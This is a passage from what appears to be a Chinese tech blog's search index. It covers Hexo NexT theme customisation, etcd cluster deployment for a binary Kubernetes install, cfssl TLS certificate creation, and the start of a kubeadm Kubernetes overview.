启用代码复制按钮 show_result: false # 显示代码复制结果 style: flat # 代码块可选样式: default | flat | mac 文章底部标签样式打开模板文件 themes/next/layout/_macro/post.swig，将以下内容替换掉 123{%- for tag in post.tags.toArray() %} &lt;a href="{{ url_for(tag.path) }}" rel="tag"&gt;{{ tag_indicate }} {{ tag.name }}&lt;/a&gt;{%- endfor %} 替换的内容如下 123{%- for tag in post.tags.toArray() %} &lt;a href="{{ url_for(tag.path) }}" rel="tag"&gt; &lt;i class="fa fa-tag"&gt;&lt;/i&gt; {{ tag.name }}&lt;/a&gt;{%- endfor %} 页面底部添加站点运行时间在 themes/next/layout/_partials/ 目录下创建 runtime.swig 源文件，并添加如下内容 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;div id="site-runtime"&gt; &lt;span class="post-meta-item-icon"&gt; &lt;i class="fa fa-clock-o"&gt;&lt;/i&gt; &lt;/span&gt; &lt;span id="runtime"&gt;&lt;/span&gt;&lt;/div&gt;&lt;script language="javascript"&gt; function isPC() { var userAgentInfo = navigator.userAgent; var agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"]; for (var i = 0; i &lt; agents.length; i++) { if (userAgentInfo.indexOf(agents[i]) &gt; 0) { return false; } } return true; } function siteTime(openOnPC, start) { window.setTimeout("siteTime(openOnPC, start)", 1000); var seconds = 1000; var minutes = seconds * 60; var hours = minutes * 60; var days = hours * 24; var years = days * 365; {%- if theme.runtime.start %} start = new Date("{{ theme.runtime.start }}"); {%- endif %} var now = new Date(); var year = now.getFullYear(); var month = now.getMonth() + 1; var date = now.getDate(); var hour = now.getHours(); var minute = now.getMinutes(); var second = now.getSeconds(); var diff = now - start; var diffYears = Math.floor(diff / years); var diffDays = Math.floor((diff / days) - diffYears * 365); var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours); var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes); var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds); if (openOnPC) { document.getElementById("runtime").innerHTML = "Running: " + diffYears + " years " + diffDays + " days " + diffHours + " hours " + diffMinutes + " mins " + diffSeconds + " secs"; } else { document.getElementById("runtime").innerHTML = "Running: " + diffYears + "y " + diffDays + "d " + diffHours + "h " + diffMinutes + "m " + diffSeconds + "s"; } } var showOnMobile = {{ theme.runtime.mobile }}; var openOnPC = isPC(); var start = new Date(); siteTime(openOnPC, start); if (!openOnPC &amp;&amp; !showOnMobile) { document.getElementById(\'site-runtime\').style.display = \'none\'; }&lt;/script&gt; 编辑源文件 themes/next/layout/_partials/footer.swig，在文件末尾添加如下内容 123{%- if theme.runtime.enable %} {% include \'runtime.swig\' %}{%- endif %} 更改 Next 主题的配置文件 themes/next/_config.yml，添加以下内容 12345678910# Site Runtimeruntime: enable: true # The time of the site started running. If not defined, current time of local time zone will be used. # You can specify the time zone by adding the `+HOURS` or `-HOURS` format time zone. # If not specify the time zone, it will use `+0000` as default. # ex: "2015-06-08 07:24:13 +0800", `+0800` specify that it is the time in the East Eight Time Zone. start: 2019-11-23 09:00:00 +0800 # Whether to show on the mobile side mobile: false Next 安装常用插件标签云插件 Hexo-Tag-Cloud 12345# 进入博客的根目录$ cd ${blog-root}/# 安装标签云插件$ npm install hexo-tag-cloud --save 更改 Next 主题的源文件 themes/next/layout/_macro/sidebar.swig, 然后在最后添加如下内容 123456789101112{% if site.tags.length &gt; 1 %}&lt;script type="text/javascript" charset="utf-8" src="{{ url_for(\'/js/tagcloud.js\') }}"&gt;&lt;/script&gt;&lt;script type="text/javascript" charset="utf-8" src="{{ url_for(\'/js/tagcanvas.js\') }}"&gt;&lt;/script&gt;&lt;div class="widget-wrap"&gt; &lt;h3 class="widget-title"&gt;Tag Cloud&lt;/h3&gt; &lt;div id="myCanvasContainer" class="widget tagcloud"&gt; &lt;canvas width="250" height="250" id="resCanvas" style="width:100%"&gt; {{ list_tags() }} &lt;/canvas&gt; &lt;/div&gt;&lt;/div&gt;{% endif %} hexo-tag-cloud 插件支持自定义标签云的字体、颜色和高亮显示，在博客的根目录里，找到 _config.yml 文件，然后添加如下的配置项 1234567tag_cloud: textFont: Trebuchet MS, Helvetica # 字体 textColor: \'#333\' # 字体颜色 textHeight: 25 # 字体大小 outlineColor: \'#E2E1D1\' maxSpeed: 0.5 # 旋转速度 pauseOnSelected: false # 当选中对应标签时，是否停止转动 完成安装和配置后，可以通过以下命令来进行本地预览，其中 hexo clean 为必须选项 1$ hexo clean &amp;&amp; hexo g &amp;&amp; hexo s 本地搜索插件Next 主题默认支持使用 Hexo-Generator-Searchdb 插件来实现本地搜索，前提是需要手动安装对应的插件 12345# 进入博客的根目录$ cd ${blog-root}/# 安装搜索插件$ npm install hexo-generator-searchdb --save 在博客的根目录里，找到 _config.yml 文件，然后添加如下的配置项 123456search: path: search.xml field: post content: true format: html limit: 1000 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 123456local_search: enable: true trigger: auto top_n_per_article: 1 unescape: false preload: false RSS 订阅插件hexo-generator-feed 插件用于在 public 目录下自动生成 atom.xml 文件 12345# 进入博客的根目录$ cd ${blog-root}/# 安装RSS订阅插件$ npm install hexo-generator-feed --save 在博客的根目录里，找到 _config.yml 文件，然后添加如下的配置项 1234567feed: limit: 20 type: atom path: atom.xml order_by: -date content_limit: 140 autodiscovery: true 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 12social: RSS: /atom.xml || fa fa-rss 站点地图插件hexo-generator-sitemap 站点地图插件会在 public 目录下自动生成 sitemap.xml 文件 12345# 进入博客的根目录$ cd ${blog-root}/# 安装插件$ npm install hexo-generator-sitemap --save 在博客的根目录里，创建站点地图的模板文件 sitemap_template.xml，将以下内容复制到文件中 12345678910111213&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt; {% for post in posts %} &lt;url&gt; &lt;loc&gt;{{ post.permalink | uriencode }}&lt;/loc&gt; {% if post.updated %} &lt;lastmod&gt;{{ post.updated.toISOString() }}&lt;/lastmod&gt; {% elif post.date %} &lt;lastmod&gt;{{ post.date.toISOString() }}&lt;/lastmod&gt; {% endif %} &lt;/url&gt; {% endfor %}&lt;/urlset&gt; 在博客的根目录里，找到 _config.yml 文件，然后添加如下的配置项 123sitemap: path: sitemap.xml template: ./sitemap_template.xml 字数与阅读时长统计插件Next 主题默认支持使用 hexo-symbols-count-time 插件来统计文章字数和阅读时长，前提是需要手动安装对应的插件 12345678# 进入博客的根目录$ cd ${blog-root}/# 安装依赖$ npm install eslint --save# 安装插件$ npm install hexo-symbols-count-time --save 在博客的根目录里，找到 _config.yml 文件，然后添加如下的配置项 123456symbols_count_time: time: true # 文章阅读时长 symbols: true # 文章字数统计 total_time: true # 站点总阅读时长 total_symbols: true # 站点总字数统计 exclude_codeblock: true # 排除代码字数统计 更改 Next 主题的配置文件 themes/next/_config.yml，设置以下内容 1234symbols_count_time: separated_meta: false # 是否另起一行显示（即不和发表时间等同一行显示） item_text_post: true # 首页文章统计数量前是否显示文字描述（本文字数、阅读时长） item_text_total: false # 页面底部统计数量前是否显示文字描述（站点总字数、站点阅读时长） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"静态博客"},{title:"Kubernetes 之二基于二进制方式搭建集群",url:"/posts/ccd6f2d4.html",text:'前言软件环境 软件 版本 安装方式 CentOS 7.9 3.10.0-1160.15.2.el7.x86_64 虚拟机 Docker docker-19.03.9 二进制安装包 Kubernetes 1.19 二进制安装包 Etcd 3.4.9 二进制安装包 集群搭建要求搭建 Kubernetes 集群需要满足以下几个条件： 一台或多台机器，建议操作系统 CentOS 7_x86_64 Master 节点的硬件配置：2GB 或更多 RAM，2 个 CPU 或更多 CPU，硬盘 20GB 或更多 Node 节点的硬件配置：4GB 或更多 RAM，4 个 CPU 或更多 CPU，硬盘 40GB 或更多 系统内可以访问外网，需要拉取镜像，如果服务器不能上网，需要提前下载镜像并导入节点 集群中所有机器之间的网络可以互通 禁用 swap 分区 集群服务器规划 Host Name 角色 IP CPU Memory Disk 组件 k8s-master master 192.168.1.109 &gt;= 2C &gt;=2G &gt;=20G kube-apiserver，kube-controller-manager，kube-scheduler，etcd k8s-node1 node 192.168.1.200 &gt;= 4C &gt;=4G &gt;=40G kubelet，kube-proxy，docker，etcd k8s-node2 node 192.168.1.111 &gt;= 4C &gt;=4G &gt;=40G kubelet，kube-proxy，docker，etcd k8s-node3 node 192.168.1.112 &gt;= 4C &gt;=4G &gt;=40G kubelet，kube-proxy，docker，etcd Kubernetes 单 Master 集群搭建系统初始化值得一提的是，以下系统初始化操作必须在所有节点上执行一次，包括 Master 节点与 Node 节点。 关闭防火墙 12345# 临时关闭# systemctl stop firewalld# 永久关闭# systemctl disable firewalld 关闭 selinux 12345# 临时关闭# setenforce 0# 永久关闭# sed -i \'s/enforcing/disabled/\' /etc/selinux/config 关闭 swap 12345# 临时关闭$ swapoff -a# 永久关闭# sed -i \'s/.*swap.*/#&amp;/\' /etc/fstab 系统时间同步 12345# 安装时间同步工具# yum install ntpdate -y# 设置时间同步服务器# ntpdate time.windows.com 将桥接的 IPv4 流量传递到 iptables 的链 1234567# 添加路由规则# vim /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-iptables = 1net.bridge.bridge-nf-call-ip6tables = 1# 配置生效# sysctl --system 设置主机名 1# hostnamectl set-hostname &lt;hostname&gt; 添加 hosts（Master 和各 Node 节点都需要配置） 123456# 添加hosts# vim /etc/hosts192.168.1.109 k8s-master192.168.1.200 k8s-node1192.168.1.111 k8s-node2192.168.1.112 k8s-node3 搭建 Etcd 集群Etcd 是一个分布式键值存储系统，Kubernetes 使用 Etcd 进行数据存储，所以先准备一个 Etcd 系统。为解决 Etcd 单点故障，建议采用集群方式部署，这里使用 3 台机器组建 Etcd 集群，可容忍 1 台机器故障。当然，也可以使用 5 台组建集群，可容忍 2 台机器故障。为了节省机器，这里与 Kubernetes 节点机器复用，也可以独立于 Kubernetes 集群之外部署，只要 api-server 能连接上就行。 CFSSL 生成证书CFSSL 是 CloudFlare 开源的一款 PKI/TLS 工具，包含一个命令行工具和一个用于签名、验证并且捆绑 TLS 证书的 HTTP API 服务，详细使用教程在这里。 安装 CFSSL 12345678910# 二进制方式安装# curl -L https://pkg.cfssl.org/R1.2/cfssl_linux-amd64 -o /usr/local/bin/cfssl# curl -L https://pkg.cfssl.org/R1.2/cfssljson_linux-amd64 -o /usr/local/bin/cfssljson# curl -L https://pkg.cfssl.org/R1.2/cfssl-certinfo_linux-amd64 -o /usr/local/bin/cfssl-certinfo# 文件授权# chmod +x /usr/local/bin/cfssl*# 配置环境变量# export PATH=/usr/local/bin:$PATH 创建 CA 证书的配置文件 1234567891011121314151617181920# cat &lt;&lt; EOF | tee ca-config.json{ "signing": { "default": { "expiry": "87600h" }, "profiles": { "www": { "expiry": "87600h", "usages": [ "signing", "key encipherment", "server auth", "client auth" ] } } }}EOF 创建 CA 证书签名的配置文件 123456789101112131415161718192021# cat &lt;&lt; EOF | tee ca-csr.json{ "CN": "etcd ca", "key": { "algo": "rsa", "size": 2048 }, "names": [ { "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" } ], "ca": { "expiry": "87600h" }}EOF 创建 Etcd 证书的配置文件，hosts 字段中的 IP 为所有 Etcd 节点的集群内部通信 IP，为了方便后期扩容，可以多写几个预留的 IP。由于这里的 Etcd 集群节点和 Kubernetes 的集群节点共同安装在不同虚拟机内，所以 IP 列表就是 Kubernetes 集群各节点的 IP 集合。 123456789101112131415161718192021222324# cat &lt;&lt; EOF | tee server-csr.json{ "CN": "etcd", "hosts": [ "192.168.1.109", "192.168.1.200", "192.168.1.111", "192.168.1.112" ], "key": { "algo": "rsa", "size": 2048 }, "names": [ { "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" } ]}EOF 使用自签 CA 签发 Etcd 证书 12345678910111213# 查看目录文件# lsca-config.json ca-csr.json server-csr.json# 生成CA证书# cfssl gencert -initca ca-csr.json | cfssljson -bare ca -# 生成Etcd证书，"-profile" 参数的值必须与 `ca-config.json` 配置文件中的值一致# cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=www server-csr.json | cfssljson -bare server# 查看生成结果# lsca-config.json ca.csr ca-csr.json ca-key.pem ca.pem server.csr server-csr.json server-key.pem server.pem 部署 Etcd 集群以下操作都是在 Kubernetes 的 Master 节点上执行，完成后会将 Master 节点上生成的所有 Etcd 文件全部拷贝到其他 Node 节点。千万不要在每个 Node 节点都单独执行生成 Etcd 证书的操作，否则 Etcd 集群里的节点可能会因证书不一致而导致集群启动失败。 Master 节点安装 Etcd 服务 1234567891011# 下载安装文件# wget https://github.com/etcd-io/etcd/releases/download/v3.4.9/etcd-v3.4.9-linux-amd64.tar.gz# 创建安装目录# mkdir -p /opt/etcd/{bin,cfg,ssl}# 解压安装文件# tar zxvf etcd-v3.4.9-linux-amd64.tar.gz# 拷贝安装文件# mv etcd-v3.4.9-linux-amd64/{etcd,etcdctl} /opt/etcd/bin/ Master 节点拷贝上面生成的 Etcd 证书 12# 拷贝证书# cp ca.pem ca-key.pem server.pem server-key.pem /opt/etcd/ssl Master 节点创建 Etcd 的配置文件，这里必须根据实际情况更改 Etcd 各节点的 IP、端口、名称 123456789101112131415# 创建Etcd的配置文件# cat &gt; /opt/etcd/cfg/etcd.conf &lt;&lt; EOF#[Member]ETCD_NAME="etcd-1"ETCD_DATA_DIR="/var/lib/etcd/default.etcd"ETCD_LISTEN_PEER_URLS="https://192.168.1.109:2380"ETCD_LISTEN_CLIENT_URLS="https://192.168.1.109:2379"#[Cluster]ETCD_INITIAL_ADVERTISE_PEER_URLS="https://192.168.1.109:2380"ETCD_ADVERTISE_CLIENT_URLS="https://192.168.1.109:2379"ETCD_INITIAL_CLUSTER="etcd-1=https://192.168.1.109:2380,etcd-2=https://192.168.1.200:2380,etcd-3=https://192.168.1.111:2380,etcd-4=https://192.168.1.112:2380"ETCD_INITIAL_CLUSTER_TOKEN="etcd-cluster"ETCD_INITIAL_CLUSTER_STATE="new"EOF 123456789ETCD_NAME：节点名称，集群中唯一ETCDDATADIR：数据目录路径ETCD_LISTEN_PEER_URLS：集群通信监听地址ETCD_LISTEN_CLIENT_URLS：客户端访问监听地址ETCD_INITIAL_ADVERTISE_PEER_URLS：集群通告地址ETCD_ADVERTISE_CLIENT_URLS：客户端通告地址ETCD_INITIAL_CLUSTER：集群节点地址ETCD_INITIAL_CLUSTER_TOKEN：集群 TokenETCD_INITIAL_CLUSTER_STATE：加入集群的当前状态，new 是新集群，existing 表示加入已有集群 Master 节点使用 Systemd 管理 Etcd 服务 1234567891011121314151617181920212223242526272829303132# 创建Etcd服务管理的配置文件# cat &gt; /usr/lib/systemd/system/etcd.service &lt;&lt; EOF[Unit]Description=Etcd ServerAfter=network.targetAfter=network-online.targetWants=network-online.target[Service]Type=notifyEnvironmentFile=/opt/etcd/cfg/etcd.confExecStart=/opt/etcd/bin/etcd \\--cert-file=/opt/etcd/ssl/server.pem \\--key-file=/opt/etcd/ssl/server-key.pem \\--peer-cert-file=/opt/etcd/ssl/server.pem \\--peer-key-file=/opt/etcd/ssl/server-key.pem \\--trusted-ca-file=/opt/etcd/ssl/ca.pem \\--peer-trusted-ca-file=/opt/etcd/ssl/ca.pem \\--logger=zapRestart=alwaysRestartSec=10sLimitNOFILE=65536[Install]WantedBy=multi-user.targetEOF# 更新配置# systemctl daemon-reload# 开机自启动# systemctl enable etcd 拷贝 Kubernetes 的 Master 节点里的所有 Etcd 文件到其他 Node 节点，并在各个 Node 节点里分别配置 Etcd 和设置 Etcd 服务开机自启动 12345678910111213141516# 拷贝Etcd的文件到各个Node节点# scp -r /opt/etcd/ root@k8s-node1:/opt/# scp -r /opt/etcd/ root@k8s-node2:/opt/# scp -r /opt/etcd/ root@k8s-node3:/opt/# 拷贝Etcd服务管理的配置文件到各个Node节点# scp /usr/lib/systemd/system/etcd.service root@k8s-node1:/usr/lib/systemd/system/# scp /usr/lib/systemd/system/etcd.service root@k8s-node2:/usr/lib/systemd/system/# scp /usr/lib/systemd/system/etcd.service root@k8s-node3:/usr/lib/systemd/system/# 在各个Node节点里分别编辑Etcd的配置文件，包括更改当前节点的名称和IP# vim /opt/etcd/cfg/etcd.conf# 在各个Node节点里分别设置Etcd服务开机自启动# systemctl daemon-reload# systemctl enable etcd 启动 Etcd 集群在 Etcd 的多个节点里分别执行以下命令来启动 Etcd 集群，值得一提的是，必须在多个 Etcd 节点里同时执行 systemctl start etcd 命令来启动集群，否则单个 Etcd 节点是无法正常启动的 123456789# 启动Etcd# systemctl start etcd# 查看运行状态# systemctl satus etcd# 查看启动日志# journalctl -u etcd# tail -f 200 /var/log/message 若 Etcd 集群启动失败，可以在各个 Etcd 节点里分别执行以下操作来解决 12345678# 关闭Etcd# systemctl stop etcd# 删除数据目录# rm -rf /var/lib/etcd/default.etcd# 重启Etcd# systemctl start etcd 参考博客 Etcd 集群故障处理 K8S 二进制部署高可用集群（Calico 网络方案） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Kubernetes 创建 TLS 证书",url:"/posts/58887565.html",text:'前言概述Kubernetes 系统的各组件需要使用 TLS 证书对通信进行加密，本文使用 CloudFlare 的 PKI 工具集 cfssl 来生成 Certificate Authority (CA) 和其它证书，使用证书的组件如下： 组件 证书 etcd ca.pem、kubernetes-key.pem、kubernetes.pem kube-apiserver ca.pem、kubernetes-key.pem、kubernetes.pem kubelet ca.pem kube-proxy ca.pem、kube-proxy-key.pem、kube-proxy.pem kubectl ca.pem、admin-key.pem、admin.pem kube-controller-manager ca-key.pem、ca.pem 用于创建证书的 Json 文件在部署 Kubernetes 集群时创建证书会使用到的 Json 文件，里面包含有 Kubernetes 各组件创建证书时使用到的 Json 文件，目录结构如下，点击下载。 12345678910111213141516├── ca│&nbsp;&nbsp; └── ca-config.json├── etcd│&nbsp;&nbsp; └── server-csr.json├── kube-apiserver│&nbsp;&nbsp; └── server-csr.json├── kube-controller-manager│&nbsp;&nbsp; └── kube-controller-manager-csr.json├── kubectl│&nbsp;&nbsp; └── admin-csr.json├── kubelet│&nbsp;&nbsp; └── kubelet.config.json├── kube-proxy│&nbsp;&nbsp; └── kube-proxy-csr.json└── kube-scheduler └── kube-scheduler-csr.json 特别注意：创建证书的操作都是在 Kubernetes 的 Master 节点上执行，证书只需要创建一次即可，以后向 Kubernetes 集群中添加新节点时，只要将对应的证书拷贝到新节点上即可。千万不要在每个 Node 节点都单独执行生成 Etcd 证书的操作，否则 Etcd 集群里的节点可能会因证书不一致而导致集群启动失败。 安装 CFSSLCFSSL 是 CloudFlare 开源的一款 PKI/TLS 工具，包含一个命令行工具和一个用于签名、验证并且捆绑 TLS 证书的 HTTP API 服务，使用 Go 语言编写。 12345678910# 二进制方式安装# curl -L https://pkg.cfssl.org/R1.2/cfssl_linux-amd64 -o /usr/local/bin/cfssl# curl -L https://pkg.cfssl.org/R1.2/cfssljson_linux-amd64 -o /usr/local/bin/cfssljson# curl -L https://pkg.cfssl.org/R1.2/cfssl-certinfo_linux-amd64 -o /usr/local/bin/cfssl-certinfo# 文件授权# chmod +x /usr/local/bin/cfssl*# 配置环境变量# export PATH=/usr/local/bin:$PATH 创建 CA 证书创建 CA 证书的配置文件 1234567891011121314151617181920# cat &lt;&lt; EOF | tee ca-config.json{ "signing": { "default": { "expiry": "87600h" }, "profiles": { "kubernetes": { "expiry": "87600h", "usages": [ "signing", "key encipherment", "server auth", "client auth" ] } } }}EOF 123456## 字段说明:expiry : 87600h 表示有效期 10 年；ca-config.json：可以定义多个 profiles，分别指定不同的过期时间、使用场景等参数；后续在签名证书时使用某个 profile；signing：表示该证书可用于签名其它证书；生成的 ca.pem 证书中 CA=TRUE；server auth：表示 client 可以用该 CA 对 server 提供的证书进行验证；client auth：表示 server 可以用该 CA 对 client 提供的证书进行验证； 创建 CA 证书签名的配置文件 123456789101112131415161718192021# cat &lt;&lt; EOF | tee ca-csr.json{ "CN": "kubernetes", "key": { "algo": "rsa", "size": 2048 }, "names": [ { "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" } ], "ca": { "expiry": "87600h" }}EOF 123## 字段说明:"CN"：Common Name，kube-apiserver 从证书中提取该字段作为请求的用户名 (User Name)；浏览器使用该字段验证网站是否合法；"O"：Organization，kube-apiserver 从证书中提取该字段作为请求用户所属的组 (Group)； 创建 CA 证书和私钥 12345678910# 查看目录下的文件# lsca-config.json ca-csr.json# 生成CA证书和私钥# cfssl gencert -initca ca-csr.json | cfssljson -bare ca -# 查看生成结果# lsca-config.json ca.csr ca-csr.json ca-key.pem ca.pem 创建 Server 证书创建用于生成 Server 证书的 Json 配置文件，如果 hosts 字段不为空，则需要指定授权使用该证书的 IP 或域名列表。由于该证书后续被 Etcd 集群和 Kubernetes 集群使用，所以一般分别指定 Etcd 集群、Kubernetes 集群各 Master、Node 节点的主机 IP 和 Kubernetes 服务 IP（通常是 kube-apiserver 指定的 service-cluster-ip-range 网段的第一个 IP，如 10.254.0.1） 123456789101112131415161718192021222324# cat &lt;&lt; EOF | tee server-csr.json{ "CN": "kubernetes", "hosts": [ "192.168.1.61", "192.168.1.62", "192.168.1.63", "192.168.1.64" ], "key": { "algo": "rsa", "size": 2048 }, "names": [ { "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" } ]}EOF 创建 Server 证书 1234567891011121314# 查看目录下的文件# lsca-config.json ca.csr ca-csr.json ca-key.pem ca.pem server-csr.json# 创建Server证书，"-profile" 参数的值必须与 `ca-config.json` 配置文件中的值一致# cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes server-csr.json | cfssljson -bare server# 查看生成结果# lsca-config.json ca.csr ca-csr.json ca-key.pem ca.pem server.csr server-csr.json server-key.pem server.pem# 验证证书# cfssl-certinfo -cert server.pem# openssl x509 -noout -text -in server.pem 参考博客 Kubernetes SSL 证书梳理 Kubernetes 创建 TLS 证书和秘钥 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Kubernetes 之一特性与 Kubeadm 方式搭建集群",url:"/posts/b728042a.html",text:'Kubernetes 概述Kubernetes 简介Kubernetes 是 Google 开源的一个容器编排引擎，简称 K8s，是用 8 代替 8 个字符 ubernete 而成的缩写。Kubernetes 可用于管理云平台中多个主机上的容器化的应用，支持自动化部署、大规模扩缩容、应用容器化管理。在生产环境中部署一个应用程序时，通常要部署该应用的多个实例以便对应用请求进行负载均衡。Kubernetes 提供了应用部署、规划、更新、维护的一种机制。在 Kubernetes 中，可以创建多个容器，每个容器里面运行一个应用实例，然后通过内置的负载均衡策略，实现对这一组应用实例的管理、发现、访问，而这些细节都不需要运维人员去进行复杂的手工配置和处理。 各种部署方式的区别传统的应用部署方式是通过插件或脚本来安装应用，这样做的缺点是应用的运行、配置、管理、所有生存周期将与当前操作系统绑定，这样做并不利于应用的升级更新、回滚等操作；当然也可以通过创建虚拟机的方式来实现某些功能，但是虚拟机非常重，并不利于可移植性。新的方式是通过部署容器方式实现，每个容器之间互相隔离，每个容器有自己的文件系统，容器之间进程不会相互影响，能区分计算资源。相对于虚拟机，容器能够快速部署，由于容器与底层设施、机器文件系统解耦的，所以它能在不同云、不同版本操作系统间进行迁移。容器占用资源少、部署快，每个应用可以被打包成一个容器镜像，每个应用与容器间成一对一关系也使容器有更大优势，使用容器可以在 build 或 release 的阶段，为应用创建容器镜像，因为每个应用不需要与其余的应用堆栈组合，也不依赖于生产环境基础结构，这使得从研发到测试、生产能提供一致环境。类似地，容器比虚拟机轻量、更 “透明”，这更便于监控和管理。 Kubernetes 功能介绍 自动装箱：基于容器对应用运行环境的资源配置要求自动部署应用容器 自我修复：当容器运行失败时，会对容器进行重启；当所部署的 Node 节点有问题时，会对容器进行重新部署和重新调度；当容器未通过监控检查时，会关闭此容器直到容器正常运行时，才会对外提供服务 水平扩展：通过简单的命令、用户 UI 界面或基于 CPU 等资源使用情况，对应用容器进行规模扩大或规模剪裁 服务发现：用户不需使用额外的服务发现机制，就能够基于 Kubernetes 自身能力实现服务发现和负载均衡 滚动更新：可以根据应用的变化，对应用容器运行的应用，进行一次性或批量式更新 版本回退：可以根据应用部署情况，对应用容器运行的应用，进行历史版本即时回退 密钥和配置管理：在不需要重新构建镜像的情况下，可以部署和更新密钥和应用配置，类似热部署 存储编排：自动实现存储系统挂载及应用，这特别对有状态应用实现数据持久化非常重要；存储系统可以来自于本地目录、网络存储（NFS、Gluster、Ceph 等）、公共云存储服务 批处理：提供一次性任务，定时任务，满足批量数据处理和分析的场景 Kubernetes 架构应用部署架构分类 无中心节点架构：GlusterFS 有中心节点架构：HDFS、K8S Kubernetes 集群架构 Kubernetes 集群架构节点角色 Master（主控节点）：Kubernetes 集群控制节点，负责对集群进行调度管理，接受集群外的用户去集群操作请求。Master 由 API Server、Scheduler、ClusterState Store（ETCD 存储系统）和 Controller MangerServer 组成 Scheduler：节点调度，选择 Node 节点来应用部署 API Server：集群统一入口，以 RESTful 接口将数据交给 ETCD 存储系统 Controller MangerServer：处理集群中的常规后台任务，一个资源对应一个控制器 Node（工作节点）：Kubernetes 集群工作节点，负责运行用户业务应用容器，Node 由 Kubelet、Kube-Proxy 和 ContainerRuntime 组成 Kubelet：负责 Pod 对应的容器的创建、启停管理，与 Master 节点协作，实现集群管理的基本功能 Kube-Proxy：提供 Kubernetes 的通信与负载均衡功能的重要组件 Kubernetes 核心概念 Kubernetes 集群搭建集群搭建方式目前生产环境搭建 Kubernetes 集群主要有以下两种方式： Kubeadm：Kubeadm 是一个 Kubernetes 部署工具，提供 kubeadm init 和 kubeadm join 命令，可用于快速搭建 Kubernetes 集群 二进制包：从 Github 下载发行版的二进制包，手动部署每个组件，组成 Kubernetes 集群。Kubeadm 虽然降低部署门槛，但屏蔽了很多细节，遇到问题很难排查。如果想更容易可控，生产环境推荐使用二进制包搭建 Kubernetes 集群，虽然手动部署比较麻烦，但期间可以学习很多工作原理，也利于后期维护 集群搭建要求搭建 Kubernetes 集群需要满足以下几个条件： 一台或多台机器，建议操作系统 CentOS 7.x86_64 Master 节点的硬件配置：2GB 或更多 RAM，2 个 CPU 或更多 CPU，硬盘 20GB 或更多 Node 节点的硬件配置：4GB 或更多 RAM，4 个 CPU 或更多 CPU，硬盘 40GB 或更多 集群中所有机器之间的网络可以互通 系统内可以访问外网，需要拉取镜像 禁用 swap 分区 集群搭建规划Kubernetes 集群搭建规划分为单 Master 集群和多 Master 集群两种，为了提高集群的高可用性，生产环境一般采用后者的规划方案，如下图所示： Kubeadm 方式搭建单 Master 集群搭建目标-（1）在所有节点上安装 Docker 和 kubeadm-（2）部署 Kubernetes Master-（3）部署容器网络插件-（4）部署 Kubernetes Node，将节点加入 Kubernetes 集群中-（5）部署 Dashboard Web 页面，可视化查看 Kubernetes 资源 软件环境 软件 版本 安装方式 CentOS 7.9 3.10.0-1160.15.2.el7.x86_64 虚拟机 Docker docker-ce-18.06.1.ce-3.el7 YUM Kubelet 1.18.0 YUM Kubeadm 1.18.0 YUM Kubectl 1.18.0 YUM Dashboard 2.0.3 Kubernetes 服务器规划 Host Name 角色 IP CPU Memory Disk k8s-master master 192.168.31.61 &gt;= 2C &gt;=2G &gt;=20G k8s-node1 node 192.168.31.62 &gt;= 4C &gt;=4G &gt;=40G k8s-node2 node 192.168.31.63 &gt;= 4C &gt;=4G &gt;=40G k8s-node3 node 192.168.31.64 &gt;= 4C &gt;=4G &gt;=40G 系统初始化值得一提的是，以下系统初始化操作都必须在所有节点上执行一次，重点包括在所有节点里安装 Docker、Kubelet、Kubeadm。这里要求 Kubelet、Kubeadm、Kubectl 的版本与 Docker 的版本互相匹配（兼容），不建议安装最新版本的 Docker，因为 Kubernetes 对最新版的 Docker 兼容不够及时，容易导致 Kubeadm 方式搭建 Kubernetes 集群失败。 关闭防火墙 12345# 临时关闭# systemctl stop firewalld# 永久关闭# systemctl disable firewalld 关闭 selinux 